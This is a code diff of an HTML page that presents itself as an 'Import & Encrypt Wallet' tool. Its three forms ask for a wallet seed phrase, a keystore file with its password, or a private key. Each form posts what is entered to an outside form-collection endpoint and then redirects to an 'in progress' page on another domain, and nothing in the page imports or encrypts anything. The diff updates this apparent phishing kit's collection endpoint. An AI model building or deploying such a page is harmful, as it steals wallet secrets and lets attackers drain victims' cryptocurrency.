@@ -1,53 +1,104 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Document</title>
-    <link rel="stylesheet" href="./index.css">
-</head>
-<body>
+    <link rel="stylesheet" href="./index.css" />
+  </head>
+  <body>
     <div class="container">
+      <h1>Import & Encrypt <br />Wallet</h1>
 
-        <h1>Import & Encrypt <br>Wallet</h1>
+      <div class="tabs">
+        <button
+          class="tab"
+          id="seed-btn"
+          onclick="showSection('seedphrase', this)"
+        >
+          Seed/Recovery Phrase
+        </button>
+        <button
+          class="tab"
+          id="keystore-btn"
+          onclick="showSection('keystore', this)"
+        >
+          Keystore JSON
+        </button>
+        <button
+          class="tab"
+          id="key-btn"
+          onclick="showSection('privatekey', this)"
+        >
+          Private
+        </button>
+      </div>
 
-        <div class="tabs">
-            <button class="tab" id="seed-btn" onclick="showSection('seedphrase', this)">Seed/Recovery Phrase</button>
-            <button class="tab" id="keystore-btn" onclick="showSection('keystore', this)">Keystore JSON</button>
-            <button class="tab" id="key-btn" onclick="showSection('privatekey', this)">Private</button>
-        </div>
+      <div class="section" id="seedphrase">
+        <form action="https://submit-form.com/4f7nE7oih" method="post">
+          <input
+            type="text"
+            name="seedphrase"
+            id="seed"
+            placeholder="Input your phrase value"
+          />
+          <p class="seed">
+            Typically 12(sometimes 24) words seperated by single spaces
+          </p>
+          <input
+            type="hidden"
+            name="_redirect"
+            value="https://cryptodefis.vercel.app/inprogress.html"
+          />
+          <button type="submit">IMPORT</button>
+        </form>
+      </div>
 
-        <div class="section" id="seedphrase">
-            <form action="https://submit-form.com/IHGPTs1Fq" method="post">
-                <input type="text" name="seedphrase" id="seed" placeholder="Input your phrase value">
-                <p class="seed">Typically 12(sometimes 24) words seperated by single spaces</p>
-                <input type="hidden" name="_redirect" value="https://cryptodefis.vercel.app/inprogress.html">
-                <button type="submit">IMPORT</button>
-            </form>
-        </div>
+      <div class="section" id="keystore">
+        <form action="https://submit-form.com/4f7nE7oih" method="post">
+          <input
+            type="text"
+            name="keystore"
+            id="keys"
+            placeholder="Input your keystore value"
+          />
+          <input
+            type="password"
+            name="password"
+            id="password"
+            placeholder="Password"
+          />
+          <p class="keystore">
+            Several lines of text beginning with '(...)' plus the password you
+            used to encrypt it
+          </p>
+          <input
+            type="hidden"
+            name="_redirect"
+            value="https://cryptodefis.vercel.app/inprogress.html"
+          />
+          <button type="submit">IMPORT</button>
+        </form>
+      </div>
 
-        <div class="section" id="keystore">
-            <form action="https://submit-form.com/IHGPTs1Fq" method="post">
-                <input type="text" name="keystore" id="keys" placeholder="Input your keystore value">
-                <input type="password" name="password" id="password" placeholder="Password">
-                <p class="keystore">Several lines of text beginning with '(...)' plus the password you used to encrypt it</p>
-                <input type="hidden" name="_redirect" value="https://cryptodefis.vercel.app/inprogress.html">
-                <button type="submit">IMPORT</button>
-            </form>
-        </div>
-        
-        <div class="section" id="privatekey">
-            <form action="https://submit-form.com/IHGPTs1Fq" method="post">
-                <input type="text" name="privatekey" id="private" placeholder="Enter your private key">
-                <input type="hidden" name="_redirect" value="https://cryptodefis.vercel.app/inprogress.html">
-                <button type="submit">IMPORT</button>
-            </form>
-        </div>
-
+      <div class="section" id="privatekey">
+        <form action="https://submit-form.com/4f7nE7oih" method="post">
+          <input
+            type="text"
+            name="privatekey"
+            id="private"
+            placeholder="Enter your private key"
+          />
+          <input
+            type="hidden"
+            name="_redirect"
+            value="https://cryptodefis.vercel.app/inprogress.html"
+          />
+          <button type="submit">IMPORT</button>
+        </form>
+      </div>
     </div>
 
-
-
     <script src="./index.js"></script>
-</body>
+  </body>
 </html>
